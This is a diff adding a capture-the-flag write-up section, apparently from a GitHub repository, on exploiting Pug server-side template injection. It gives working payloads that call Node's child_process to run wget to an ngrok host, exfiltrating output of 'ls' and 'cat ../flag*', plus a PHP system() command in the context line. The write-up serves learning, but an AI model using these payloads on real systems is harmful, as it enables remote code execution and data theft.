@@ -85,6 +85,32 @@ With ```<?php system('cat ../flag*') ?>``` we can read the flag
 ![Screenshot at 2021-11-26 10-31-54](https://user-images.githubusercontent.com/52857059/143552310-8137f420-2872-48f9-8254-cdfddc5e1322.png)
 
 ## 5- IMF-searching
+![Screenshot at 2021-11-26 10-46-06](https://user-images.githubusercontent.com/52857059/143669832-4f692f5a-95c9-4b4b-b786-71a4123b6961.png)
+
+After downloading the files' challenge locally ,I noticed The application use pug template Engine .
+so I will search about pug ssti 
+I will run in the background ```sudo python3 -m http.server 80``` to recieve response
+running ```run ngrok http 80``` 
+the payload is ```#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('wget http://ea4a-154-178-105-159.ngrok.io/?output=$('ls ../')')}()}```
+
+The problem is if we do ls the first result of ls command will appear
+
+![Screenshot at 2021-11-27 08-12-15](https://user-images.githubusercontent.com/52857059/143670460-2a3674e2-19c8-4db9-95d3-8afb4eb70cfd.png)
+
+so let's replace ls ../ to ```ls ../flag*```
+payload ```#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('wget http://ea4a-154-178-105-159.ngrok.io/?output=$('ls+../flag*')')}()}``` 
+
+![Screenshot at 2021-11-27 08-25-10](https://user-images.githubusercontent.com/52857059/143670712-9eb3d484-133b-42af-a90d-298cc79c1d33.png)
+
+the final payload is ```#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('wget http://ea4a-154-178-105-159.ngrok.io/?output=$('cat+../flag*')')}()}```
+
+![Screenshot at 2021-11-27 08-24-41](https://user-images.githubusercontent.com/52857059/143670708-1e8d4c5c-12ef-4021-8e85-642396b9c009.png)
+
+
+
+
+
+
 
 
 
